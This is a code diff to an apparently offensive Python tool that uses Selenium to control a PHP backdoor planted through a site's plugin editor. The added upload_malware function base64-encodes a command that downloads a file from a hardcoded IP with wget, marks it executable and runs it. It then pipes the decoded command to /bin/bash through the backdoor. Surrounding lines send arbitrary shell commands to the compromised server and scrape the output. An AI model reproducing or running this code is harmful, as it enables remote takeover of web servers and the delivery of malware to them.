@@ -8,6 +8,7 @@ from selenium.common.exceptions import TimeoutException
 from bs4 import BeautifulSoup
 import urllib.parse
 import argparse, logging, sys
+import base64
 
 FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
 EDIT_PLUGIN_URL:str #URL to currently working plugin for php backdoor
@@ -199,8 +200,18 @@ def select_plugin():
         exit(-1)
     return p_name, f_name, p_orginal
     
-def upload_malware():
-    pass
+def upload_malware(backdoor_url, file):
+    try:
+        ip = "192.168.178.115"
+        cmd = f"wget http://{ip}:8000/{file}; chmod +x {file}; ./{file}"
+        message_bytes = cmd.encode('ascii')
+        base64_bytes = base64.b64encode(message_bytes)
+        base64_message = base64_bytes.decode('ascii')
+        cmd = f'echo {base64_message} | base64 -d | /bin/bash'
+        driver.get(f'{backdoor_url}?0={cmd}')
+    except:
+        pass
+
 
 def exec_cmd(p_name, f_name, p_orginal):
     '''
@@ -228,7 +239,7 @@ def exec_cmd(p_name, f_name, p_orginal):
                 break
             elif 'upload' == cmd.split(' ')[0]: # upload malware to target server
                 file = cmd.split(' ')[1]
-                upload_malware(file)
+                upload_malware(backdoor_url, file)
             else: # send os command
                 driver.get(f'{backdoor_url}?0={cmd}')
                 cleantext = BeautifulSoup(driver.page_source, "lxml").text # remove html code from command output
